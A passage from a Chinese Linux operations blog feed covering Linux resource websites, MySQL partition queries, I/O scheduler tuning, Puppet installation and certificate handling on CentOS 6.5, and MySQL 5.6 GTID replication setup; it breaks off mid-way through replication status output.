<p><strong>9. <a href="http://copy.sh/v24/" target="_blank" rel="external">Copy.sh</a> 浏览器运行虚拟机</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/copy.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/copy.jpg" alt="copy"></a></p>
<p>  又一个非常crazy的工具，在线运行虚拟机，可以选择下载虚拟机镜像也可以上传自己的iso，copy.sh在线运行虚拟机源码：<a href="https://github.com/copy/v86" target="_blank" rel="external">https://github.com/copy/v86</a>；</p>
<p><strong>10. <a href="http://commandlinefu.com/" target="_blank" rel="external">Commandlinefu.com</a> 命令或记录网站</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/commandlinefu.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/commandlinefu.jpg" alt="commandlinefu"></a></p>
<p>  做运维的应该都知道这个网站，可以分享自己的CLI库，也可以学习借鉴别人的命令脚本</p>
<p><strong>11. <a href="http://alias.sh/" target="_blank" rel="external">Alias.sh</a> 命令别名数据库</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/alias.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/alias.jpg" alt="alias"></a></p>
<p>  有点类似commandlinefu了，可以通过这个网站借鉴获取和分享有用的命令别名<br>比如lr别名定义了显示目录树</p>
<pre><code>alias lr=&apos;ls -R | grep &quot;:$&quot; | sed -e &apos;\&apos;&apos;s/:$//&apos;\&apos;&apos; -e &apos;\&apos;&apos;s/[^-][^\/]*\//--/g&apos;\&apos;&apos; -e &apos;\&apos;&apos;s/^/   /&apos;\&apos;&apos; -e &apos;\&apos;&apos;s/-/|/&apos;\&apos;&apos;&apos;
</code></pre><p><strong>12. <a href="http://distrowatch.com/" target="_blank" rel="external">Distrowatch.com</a> 提供了Linux发行版的详细信息</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/distrowatch.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/distrowatch.jpg" alt="distrowatch"></a></p>
<p>  通过Distrowath不仅可以精确的查看互联网都有哪些流行的Linux发行版，还可以查看每个发行版的相关信息如默认桌面环境、默认应用程序及镜像的下载链接；堪称Linux的数据库</p>
<p><strong>13. <a href="http://linuxmanpages.com/" target="_blank" rel="external">Linuxmanpages.com</a> 在线查看命令帮助</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/manpages.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/manpages.jpg" alt="manpages"></a></p>
<p>  相当于系统内部的man、help、info等的综合吧</p>
<p><strong>14. <a href="http://awesomecow.com/" target="_blank" rel="external">AwesomeCow.com</a> 适用Linux环境的软件搜索引擎</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/awe.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/awe.jpg" alt="awe"></a></p>
<p>  如果有款win下好用的软件想在linux下使用，或许可以通过AwesomeCow找到与其类似或者一样的软件，或者通过WINE</p>
<p><strong>15. <a href="http://penguspy.com/" target="_blank" rel="external">PenguSpy.com</a> Linux好玩游戏合集</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/pengu.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/pengu.jpg" alt="pengu"></a></p>
<p><strong>16. <a href="http://lxr.free-electrons.com/" target="_blank" rel="external">Linux Cross Reference by Free Electrons</a> 在线查看内核代码及不同版本的差异</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/cross.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/cross.jpg" alt="cross"></a></p>
<p>对于内核开发者或许有很大的帮助</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[查看分区信息]]></title>
      <url>/2014/08/20/select-partition-info.html</url>
      <content type="html"><![CDATA[<p>查看Mysql里都有哪些数据库里面有什么分区表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">SELECT </div><div class="line">TABLE_SCHEMA, TABLE_NAME, PARTITION_NAME, PARTITION_COMMENT</div><div class="line">FROM</div><div class="line">INFORMATION_SCHEMA.PARTITIONS</div><div class="line">WHERE</div><div class="line">PARTITION_NAME IS NOT NULL;</div></pre></td></tr></table></figure></p>
<p>查看某个分区表都有哪些分区及使用情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">USE LOCKLOG;</div><div class="line">SELECT </div><div class="line">partition_name part,</div><div class="line">partition_expression expr,</div><div class="line">partition_description descr,</div><div class="line">table_rows</div><div class="line">FROM</div><div class="line">INFORMATION_SCHEMA.partitions</div><div class="line">WHERE</div><div class="line">TABLE_SCHEMA = schema()</div><div class="line">AND TABLE_NAME = &apos;lock_log&apos;;</div></pre></td></tr></table></figure></p>
<p>查看分区表lock_log的创建sql及分区类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SHOW CREATE TABLE lock_log \G;</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 分区 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[IO调度算法适用场景]]></title>
      <url>/2014/08/20/io-scheduler.html</url>
      <content type="html"><![CDATA[<pre><code>通常磁盘的读写影响是由磁头到柱面移动造成了延迟，解决这种延迟内核主要采用两种策略：缓存和IO调度算法来进行弥补
</code></pre><p><strong>Caching：</strong>IO请求被缓存在大页和buffer<br>caches里面，读请求会预先从缓存读取，写请求会先写进缓存，然后在保存到磁盘</p>
<p><strong>四种IO调度算法：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cat /sys/block/sda/queue/scheduler</div><div class="line">noop anticipatory deadline [cfq] (当前是cfq)</div></pre></td></tr></table></figure></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/io1.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/io1.png" alt="io"></a></p>
<p><strong>noop：</strong>noop调度算法不会对I/O请求排序操作，除了合并外也不会做任何其他优化，直接以类似FIFO的顺序提交I/O请求；对于SSD、虚拟机或者存储设备可能会更加高效<br><strong>anticipatory(as)：</strong>基于预测的IO算法，类似DeadLine，也维护了三个请求对列；区别在于当它处理完一个I/O请求后并不会直接返回处理下一个请求，而是等待6ms(默认),如果这时候有新来的针对当前扇区相邻扇区的请求，那么会直接处理它，当等待时间结束后，调度器才返回处理下一个对列请求<br>试想一下，如果系统有频繁的针对邻近扇区的I/O请求，那么这种预测算法必然大幅提高整体的吞吐量，毕竟节约了那么多寻道时间<br><strong>deadline：</strong>DEADLINE 在CFQ的基础上，解决了IO请求饿死的极端情况。除了CFQ本身具有的IO排序队列之外，DEADLINE额外分别为读IO和写IO提供了FIFO队 列。读FIFO队列的最大等待时间为500ms，写FIFO队列的最大等待时间为5s。FIFO队列内的IO请求优先级要比CFQ队列中的高，，而读 FIFO队列的优先级又比写FIFO队列的优先级高。优先级可以表示如下：<br>FIFO(Read) &gt; FIFO(Write) &gt; CFQ<br>deadline 算法保证对于既定的 IO 请求以最小的延迟时间，从这一点理解，对于 DSS 应用应该会是很适合的<br><strong>cfq(2.6.18+内核默认CFQ)：</strong>该算法的特点是按照IO请求的地址进行排序，而不是按照先来后到的顺序来进行响应。在传统的SAS盘上，磁盘寻道花去了绝大多数的IO响应时间。CFQ的出发点是对IO地址进行排序，以尽量少的磁盘旋转次数来满足尽可能多的IO请求。在 CFQ算法下，SAS盘的吞吐量大大提高了。但是相比于NOOP的缺点是，先来的IO请求并不一定能被满足，可能会出现饿死的情况；</p>
<p><strong>调度算法适用场合：</strong><br>在传统的SAS盘上，CFQ、DEADLINE、ANTICIPATORY都是不错的选择；对于专属的数据库服务器和文件服务器，DEADLINE的吞吐量和响应时间都表现良好，适用于大量IO操作的环境</p>
<p>在SSD、Fusion IO上，最简单的NOOP反而可能是最好的算法，因为其他三个算法的优化是基于缩短寻道时间的，而固态硬盘没有所谓的寻道时间且IO响应时间非常短。<br>ANTICIPATORY通常更适用于大量持续读的环境，并不适用于DB Server<br>CFQ 适用于有大量来自不同进程的并发读写的环境如桌面环境等</p>
<p><strong>手动临时更改调度算法：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo deadline &gt; /sys/block/sda/queue/scheduler</div></pre></td></tr></table></figure></p>
<p><strong>永久更改：</strong><br><strong>A.使用tuned来修改调度算法</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">比如：vim /etc/tuned-profiles/throughtput-performance/ktune.sysconfig</div><div class="line">ELEVATOR=&quot;deadline&quot;</div><div class="line">ELEVATOR_TUNE_DEVS=&quot;/sys/block/&#123;sd,cciss,dm-,vd&#125;*/queue/scheduler&quot;</div><div class="line">tuned-admin profile throughtput-performance</div><div class="line">chkconfig tuned on</div><div class="line">chkconfig ktune on</div><div class="line">更改调度算法之后/sys/block/sda/quue/iosched/会生成对应的参数文件</div></pre></td></tr></table></figure></p>
<p><strong>B.通过修改grub.conf来修改调度算法</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">kernel /vmlinuz-2.6.32-358.11.1.el6.x86_64 ro root=UUID=97693d73-443f-438a-90a3-208855faff19 rd_NO_LUKS  KEYBOARDTYPE=pc KEYTABLE=us rd_NO_MD crashkernel=auto LANG=zh_CN.UTF-8 rd_NO_LVM rd_NO_DM elevator=deadline rhgb quiet</div></pre></td></tr></table></figure></p>
<p><strong>查看调度算法参数的含义：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">yum -y install kernel-doc</div><div class="line">比如:/usr/share/doc/kernel-doc-2.6.32/Documentation/block/deadline-iosched.txt</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> IO调度 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Centos6.5下安装Puppet及测试]]></title>
      <url>/2014/08/20/centos-puppet-install-test.html</url>
      <content type="html"><![CDATA[<h4 id="安装前注意事项"><a href="#安装前注意事项" class="headerlink" title="安装前注意事项"></a>安装前注意事项</h4><ol>
<li>Puppet master尽量使用高配置server</li>
<li>任何官方未支持的系统也可以正常运行puppet，前提是要装合适的版本的ruby环境<br>请参考:<a href="http://docs.puppetlabs.com/puppet/latest/reference/system_requirements.html#basic-requirements" target="_blank" rel="external">http://docs.puppetlabs.com/puppet/latest/reference/system_requirements.html#basic-requirements</a></li>
<li>master防火墙放行8140端口给agent</li>
<li>每个节点都必须有一个唯一的主机名，正解析和反解析都被正确配置，如果没有DNS服务，必须在每个节点上配置/etc/hosts<br><strong>注</strong>：默认情况下puppet的master的主机名是puppet</li>
<li>由于Puppet master同时扮演着CA(认证授权机构)的角色,需要时间同步,启动ntpd服务；</li>
<li>两种工作模式：Master/Agent、Standatone</li>
</ol>
<h4 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">192.168.10.216   Puppet Agent   c1.geekwolf.github.io</div><div class="line">192.168.10.217   Puppet Agent   c2.geekwolf.github.io</div><div class="line">192.168.10.218   Puppet Master  m.geekwolf.github.io</div></pre></td></tr></table></figure>
<h4 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h4><h5 id="安装puppet"><a href="#安装puppet" class="headerlink" title="安装puppet"></a>安装puppet</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">rpm -ivh [http://yum.puppetlabs.com/puppetlabs-release-el-6.noarch.rpm](http://yum.puppetlabs.com/puppetlabs-release-el-6.noarch.rpm)</div><div class="line">说明:若要测试RC版及相关软件编辑/etc/yum.repos.d/puppetlabs.repo：</div><div class="line"></div><div class="line">[puppetlabs-devel]</div><div class="line">name=Puppet Labs Devel El 6 - $basearch</div><div class="line">baseurl=http://yum.puppetlabs.com/el/6/devel/$basearch</div><div class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-puppetlabs</div><div class="line">enabled=1</div><div class="line">gpgcheck=1</div><div class="line"></div><div class="line">yum -y install  ntp</div><div class="line">service ntpd start</div><div class="line">chkconfig ntpd on</div></pre></td></tr></table></figure>
<h5 id="配置puppet"><a href="#配置puppet" class="headerlink" title="配置puppet"></a>配置puppet</h5><p>配置好hostname，并将解析写进hosts同步到所有节点<br><strong>在master:192.168.10.218安装puppet-server</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">yum -y install puppet-server（依赖puppet、facter一起安装）</div><div class="line">生成启动脚本:</div><div class="line">/etc/init.d/puppetmaster </div><div class="line">Master配置文件目录：</div><div class="line">/etc/puppet</div><div class="line"></div><div class="line">chkconfig puppetmaster on</div><div class="line">service puppetmaster start</div><div class="line"></div><div class="line">升级puppet master：</div><div class="line">puppet resource package puppet ensure=latest</div><div class="line">service puppetmaster restart</div></pre></td></tr></table></figure></p>
<p><strong>在c1 c2 上安装puppet</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">yum -y install puppet</div><div class="line">chkconfig puppet on</div><div class="line">service puppet start</div><div class="line">Agent配置文件目录:</div><div class="line">/etc/sysconfig/puppet.conf</div></pre></td></tr></table></figure></p>
<p><strong>配置puppet agent c1 c2指定Puppet Master地址</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">vim  /etc/puppet/puppet.conf</div><div class="line">[main]</div><div class="line"># The Puppet log directory.</div><div class="line"># The default value is &apos;$vardir/log&apos;.</div><div class="line">logdir = /var/log/puppet</div><div class="line"># Where Puppet PID files are kept.</div><div class="line"># The default value is &apos;$vardir/run&apos;.</div><div class="line">rundir = /var/run/puppet</div><div class="line"># Where SSL certificates are kept.</div><div class="line"># The default value is &apos;$confdir/ssl&apos;.</div><div class="line">ssldir = $vardir/ssl</div><div class="line">[agent]</div><div class="line"># The file in which puppetd stores a list of the classes</div><div class="line"># associated with the retrieved configuratiion. Can be loaded in</div><div class="line"># the separate ``puppet`` executable using the ``--loadclasses``</div><div class="line"># option.</div><div class="line"># The default value is &apos;$confdir/classes.txt&apos;.</div><div class="line">classfile = $vardir/classes.txt</div><div class="line"># Where puppetd caches the local configuration. An</div><div class="line"># extension indicating the cache format is added automatically.</div><div class="line"># The default value is &apos;$confdir/localconfig&apos;.</div><div class="line">localconfig = $vardir/localconfig</div><div class="line">server = m.geekwolf.github.io</div></pre></td></tr></table></figure>
<h5 id="证书管理"><a href="#证书管理" class="headerlink" title="证书管理"></a>证书管理</h5><p><strong>A.手动签发证书</strong><br>c1、c2申请证书，由于已经配置了server=m.geekwolf.github.io，故申请时不必在指定server<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[root@c1 ~]# puppet agent -t</div><div class="line">Info: Creating a new SSL key for c1.geekwolf.github.io</div><div class="line">Info: Caching certificate for ca</div><div class="line">Info: Caching certificate_request for c1.geekwolf.github.io</div><div class="line">Info: Caching certificate for ca</div><div class="line">Exiting; no certificate found and waitforcert is disabled</div></pre></td></tr></table></figure></p>
<p>在Master上管理证书：<br><strong>签发证书：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">puppet cert list --all                   查看请求签发的证书（+表示已签发，-未签发）</div><div class="line">puppet cert --sign c1.geekwolf.github.io 签发主机c1.geekwolf.github.io的证书</div><div class="line">puppet cert --sign --all                 签发所有请求的主机的证书</div></pre></td></tr></table></figure></p>
<p><strong>注销证书：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">puppet cert revoke  c1.geekwolf.github.io 注销主机c1.geekwolf.github.io的证书</div><div class="line">puppet cert revoke --all                  注销所有主机的证书（若想在重新签名，需先重启puppetmaster,然后节点在请求申请证书，再签名即可）</div></pre></td></tr></table></figure></p>
<p><strong>清除证书：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">在master上清除某节点证书,重启puppetmaster后生效</div><div class="line">puppet cert --clean c1.geekwolf.github.io </div><div class="line"></div><div class="line">在agent上删除相关目录,可以重新再申请签名   </div><div class="line">rm -rf /var/lib/puppet/ssl 或者rm -rf /var/lib/puppet/certs/c1.geekwolf.github.io.pem</div></pre></td></tr></table></figure></p>
<p><strong>B.自动签发证书</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">在Puppet Master创建/etc/puppet/autosign.conf文件</div><div class="line">*.geekwolf.github.io (geekwolf.github.io域的申请会自动签发)</div><div class="line">service puppetmaster restart</div><div class="line">所有节点上执行</div><div class="line">rm -rf /var/lib/puppet/ssl</div><div class="line"></div><div class="line">然后所有的节点申请签名</div><div class="line">puppet agent -t —server m.geekwolf.github.io</div><div class="line"></div><div class="line">在Puppet Master查看签名</div><div class="line">[root@m puppet]# puppet cert list --all</div><div class="line">+ &quot;c1.geekwolf.github.io&quot; (SHA256) 2A:28:96:6C:B0:36:E8:CC:71:80:F4:C6:B5:D8:61:94:A8:59:46:9D:52:A3:58:2A:D9:78:45:A3:57:93:1C:38</div><div class="line">+ &quot;c2.geekwolf.github.io&quot; (SHA256) 09:59:71:9A:CA:AE:92:82:1D:D4:0C:A6:D4:5F:51:C3:D6:E4:EE:80:20:19:CB:B1:71:EE:B3:24:F7:E3:80:71</div><div class="line">+ &quot;m.geekwolf.github.io&quot; (SHA256) 10:F3:28:EA:36:25:38:C5:1C:8A:38:FD:94:EF:F9:77:6B:97:E9:FA:60:18:D5:53:DD:5D:DA:15:88:4F:96:A1 (alt names: &quot;DNS:m.geekwolf.github.io&quot;, &quot;DNS:puppet&quot;, &quot;DNS:puppet.geekwolf.github.io&quot;)</div></pre></td></tr></table></figure></p>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">默认agent（c1，c2）每30分钟连接到puppet master,为测试方便先修改连接时间</div><div class="line">echo &quot;runinterval = 10&quot; &amp;gt;&amp;gt;/etc/puppet/puppet.conf</div><div class="line">service puppet restart</div><div class="line"></div><div class="line">Puppet Master：</div><div class="line">vim /etc/puppet/manifests/site.pp</div><div class="line">file &#123;&quot;/tmp/test.txt&quot; :</div><div class="line">content=&amp;gt;&quot;test from geekwolf!~\n&quot;; &#125; </div><div class="line"></div><div class="line">检查c1 c2是否有/tmp/test.txt文件</div></pre></td></tr></table></figure>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote>
<p><a href="http://docs.puppetlabs.com/puppet/3.6/reference/config_ssl_external_ca.html#option-3-two-intermediate-cas-issued-by-one-root-ca" target="_blank" rel="external">多CA配置</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 自动化运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> puppet </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL5.6基于GTID复制配置]]></title>
      <url>/2014/08/20/mysql-gtid-rep.html</url>
      <content type="html"><![CDATA[<h4 id="一、什么是GTID？"><a href="#一、什么是GTID？" class="headerlink" title="一、什么是GTID？"></a>一、什么是GTID？</h4><blockquote>
<p> GTID(Global Transaction Identifiers)是全局事务标识<br>当使用GTIDS时，在主上提交的每一个事务都会被识别和跟踪，并且运用到所有从MySQL，而且配置主从或者主从切换时不再需要指定 master_log_files和master_log_pos；由于GTID-base复制是完全基于事务的，所以能很简单的决定主从复制的一致性；官方建议Binlog采用Row格式</p>
</blockquote>
<h4 id="二、GTID的表示方式"><a href="#二、GTID的表示方式" class="headerlink" title="二、GTID的表示方式"></a>二、GTID的表示方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">source_id：transaction_id</div><div class="line">source_id：表示执行事务的主库的UUID(server_uuid:Mysql5.6的data目录下启动时会生成auto.cnf文件记录了uuid，重启后uuid不变，删除文件后会重新生成新的uuid)；</div><div class="line">transaction_id：是一个从1开始自增的计数，表示在这个主库上执行的第n个事务；</div><div class="line">由于每台Mysql的uuid是全球唯一的，transaction_id自身唯一，就保证了GTID全局唯一性</div><div class="line"></div><div class="line">mysql&gt; show variables like &apos;server_uuid&apos;; </div><div class="line">+---------------+--------------------------------------+</div><div class="line">| Variable_name | Value |</div><div class="line">+---------------+--------------------------------------+</div><div class="line">| server_uuid | 4468c0e8-ef6f-11e3-9c2c-0200c0a80ad8 |</div><div class="line">+---------------+--------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure>
<h4 id="三、基于GTID的复制配置"><a href="#三、基于GTID的复制配置" class="headerlink" title="三、基于GTID的复制配置"></a>三、基于GTID的复制配置</h4><p><strong>master：</strong>192.168.10.216<br><strong>slave ：</strong>192.168.10.217<br><strong>步骤：</strong><br>修改主从my.cnf增加GTID支持—&gt;主只读—&gt;拷贝数据到从数据目录—&gt;重启主从—&gt;在从上进行配置</p>
<ol>
<li>修改主从my.cnf增加GTID支持</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">主Mysql配置：</div><div class="line">server-id=216   </div><div class="line">binlog-format=ROW</div><div class="line">gtid-mode=on</div><div class="line">enforce-gtid-consistency=true </div><div class="line">log-bin=mysql-bin</div><div class="line">log-slave-updates=true   slave更新是否记入日志</div><div class="line"></div><div class="line">从Mysql配置：</div><div class="line">server-id=217   同一个复制拓扑中的所有服务器的id号必须惟一</div><div class="line">binlog-format=ROW</div><div class="line">gtid-mode=on  启用gtid类型，否则就是普通的复制架构</div><div class="line">enforce-gtid-consistency=true 强制GTID的一致性</div><div class="line">log-bin=mysql-bin</div><div class="line">log-slave-updates=true   slave更新是否记入日志</div><div class="line">只从库配置：</div><div class="line">slave-paralles-workers 设定从服务器的SQL线程数；0表示关闭多线程复制功能；</div></pre></td></tr></table></figure>
<ol>
<li>主只读</li>
</ol>
<p><code>mysql&gt; SET @@global.read_only = ON;</code><br>拷贝主数据到从目录</p>
<ol>
<li>重启主从Mysql</li>
<li><p>在从上配置基于GTID的复制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; CHANGE MASTER TO </div><div class="line">     &gt; MASTER_HOST = ‘192.168.10.216’,</div><div class="line">     &gt; MASTER_PORT = 3306,</div><div class="line">     &gt; MASTER_USER = &apos;rep&apos;,</div><div class="line">     &gt; MASTER_PASSWORD = &apos;geekwolf&apos;,</div><div class="line">     &gt; MASTER_AUTO_POSITION = 1;</div></pre></td></tr></table></figure>
</li>
<li><p>启动从库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">mysql&gt; start slave; </div><div class="line">Query OK, 0 rows affected, 1 warning (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; show slave status \G</div><div class="line">*************************** 1. row ***************************</div><div class="line">   Slave_IO_State: Waiting for master to send event</div><div class="line">  Master_Host: 192.168.10.216</div><div class="line">  Master_User: rep</div><div class="line">  Master_Port: 3306</div><div class="line">Connect_Retry: 60</div><div class="line">  Master_Log_File: mysql-bin.000002</div><div class="line">  Read_Master_Log_Pos: 41921904</div><div class="line">   Relay_Log_File: relay-bin.000002</div><div class="line">Relay_Log_Pos: 64520</div><div class="line">Relay_Master_Log_File: mysql-bin.000002</div><div class="line"> Slave_IO_Running: Yes</div><div class="line">Slave_SQL_Running: Yes</div><div class="line">  Replicate_Do_DB:</div><div class="line">  Replicate_Ignore_DB:</div><div class="line">   Replicate_Do_Table:</div><div class="line">   Replicate_Ignore_Table:</div><div class="line">  Replicate_Wild_Do_Table:</div><div class="line">  Replicate_Wild_Ignore_Table: mysql.%</div><div class="line">   Last_Errno: 0</div><div class="line">   Last_Error:</div><div class="line"> Skip_Counter: 0</div><div class="line">  Exec_Master_Log_Pos: 41921904</div><div class="line">  Relay_Log_Space: 64718</div><div class="line">  Until_Condition: None</div><div class="line">   Until_Log_File:</div><div class="line">Until_Log_Pos: 0</div><div class="line">   Master_SSL_Allowed: No</div><div class="line">   Master_SSL_CA_File:</div><div class="line">   Master_SSL_CA_Path:</div><div class="line">  Master_SSL_Cert:</div><div class="line">Master_SSL_Cipher:</div><div class="line">   Master_SSL_Key:</div><div class="line">Seconds_Behind_Master: 0</div><div class="line">Master_SSL_Verify_Server_Cert: No</div><div class="line">Last_IO_Errno: 0</div><div class="line">Last_IO_Error:</div><div class="line">   Last_SQL_Errno: 0</div><div class="line">   Last_SQL_Error:</div><div class="line">  Replicate_Ignore_Server_Ids:</div><div class="line"> Master_Server_Id: 216</div><div class="line">  Master_UUID: 21ad8db5-f038-11e3-a14a-0200c0a80ad8</div><div class="line"> Master_Info_File: /usr/local/mysql/data/master.info</div><div class="line">SQL_Delay: 0</div><div class="line">  SQL_Remaining_Delay: NULL</div><div class="line">  Slave_SQL_Running_State: Reading event from the relay log</div><div 